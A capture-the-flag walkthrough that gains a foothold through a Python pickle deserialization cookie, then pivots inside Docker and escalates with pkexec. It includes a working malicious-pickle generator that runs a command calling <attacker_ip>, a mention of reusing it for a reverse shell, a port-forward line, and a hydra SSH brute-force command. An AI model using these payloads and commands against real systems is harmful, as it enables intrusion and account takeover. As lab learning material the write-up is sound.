Through scanning I found only one port is open, 5003. Running http. <br/>
Give a visit to the page.  <br/>
![](Assets/up1.png) <br/>
While `robots.txt` gives some error. <br/>
![](Assets/up2.png) <br/>
Reveals some page. But that didn't work. So observing the pages I understand It is a python base server. And as it is a CTF room, the home page pronounces pickle so much. So it could have a pickle base vulnerability. After some testing I found the cookie. <br/>
![](Assets/up3.png) <br/>
It is a **base64-encoded Python pickle object**.  <br/>
Search with the word `chocolate`. <br/>
![](Assets/up4.png) <br/>
Returns search result and cookie. <br/>
![](Assets/up5.png) <br/>
Using the following python script I decrypt it. 
```python
import pickle
import base64

encoded = "gASVJQAAAAAAAACMIV9faW1wb3J0X18oJ29zJykuc3lzdGVtKCd3aG9hbWknKZQu"
data = pickle.loads(base64.b64decode(encoded))

print(data) 
print(type(data))
```
![](Assets/up6.png)<br/>
The result: <br/>
![](Assets/up7.png) <br/>
For testing deserialization vulnerability using the following code to create a pickle payload.
```python3
import pickle
import base64
import os

class Malicious:
    def __reduce__(self):
        # Execute system command
        return (os.system, ('ping <attacker_ip> -c 5',))

# Create malicious pickle
malicious = base64.b64encode(pickle.dumps(Malicious()))
print(malicious)
```
It will ping my ip address that confirms the vulnerability. <br/>
![](Assets/up9.png) <br/>
Opened a icmp listener with `tcpdump`. <br/>
![](Assets/up8.png) <br/>
Copy the payload and replace it with the cookie. And send it. <br/>
![](Assets/up10.png) <br/>
Got the following. <br/>
![](Assets/up11.png) <br/>
Then I create a pyload with for reverse shell with the same script. And again change it with the cookie. And got the shell. <br/>
![](Assets/up12.png) <br/>
![](Assets/up13.png) <br/>
In `/` directory I found `.dockerenv`. So I am inside a container. <br/>
![](Assets/up14.png) <br/>
While enumerating I found the following in the `/root/.bash_history`. <br/>
![](Assets/up15.png) <br/>
Two new IP addresses. `172.17.0.1` and `172.17.0.2`. From linpeas I found that the second IP is docker ip. <br/>
![](Assets/up16.png) <br/>
Need to look for the first one. <br/>
![](Assets/up17.png) <br/>
Using `linpeas.sh` I performed network scanning for the Ip. And found two open ports.  <br/>
![](Assets/up18.png) <br/>
Using penelope port forwarding I performed port forwarding.  <br/>
**penelope is very handy, gives many facilities, and makes easier penetration testing. A [article](https://www.hackingarticles.in/penelope-a-modern-alternative-to-netcat-for-red-teamers/) about the usage. Gihub [repo](https://github.com/brightio/penelope.git)** 
```bash
portfwd <attacker_ip>:<port> -> <victim_ip>:<port>
```
![](Assets/up19.png) <br/>
After that I performe bruteforcing for ssh. <br/>
```bash
hydra -l ramsey -P /usr/share/wordlist/rockyou.txt <attacker_ip> ssh -s <port>
```
![](Assets/up20.png) <br/>
Using the password I logged in as `ramsey`.  <br/>
![](Assets/up21.png) 
# Privilege Escalation
I ran `linpeas.sh` and found that it has pkexec vulnerability. <br/>
![](Assets/up22.png) <br/>
Abusing this I got root shell. <br/>
![](Assets/up23.png) <br/>